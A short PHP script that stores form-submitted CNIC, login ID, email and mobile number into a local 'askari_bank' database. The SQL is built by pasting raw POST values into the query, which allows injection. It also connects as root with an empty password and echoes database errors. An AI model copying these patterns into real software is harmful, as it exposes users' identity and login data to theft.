<?php
// Database connection parameters
$servername = "localhost";  // Change to your server name or IP
$username = "root";         // Database username
$password = "";             // Database password (leave empty if no password)
$dbname = "askari_bank";    // Your database name

// Create a connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get the form data
$cnic = $_POST['cnic'];
$login_id = $_POST['login-id'];
$email = $_POST['email'];
$mobile = $_POST['mobile'];

// Prepare an SQL query to insert the data into the database
$sql = "INSERT INTO registrations (cnic, login_id, email, mobile)
        VALUES ('$cnic', '$login_id', '$email', '$mobile')";

// Check if the query was successful
if ($conn->query($sql) === TRUE) {
    echo "Registration successful!";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Close the connection
$conn->close();
?>
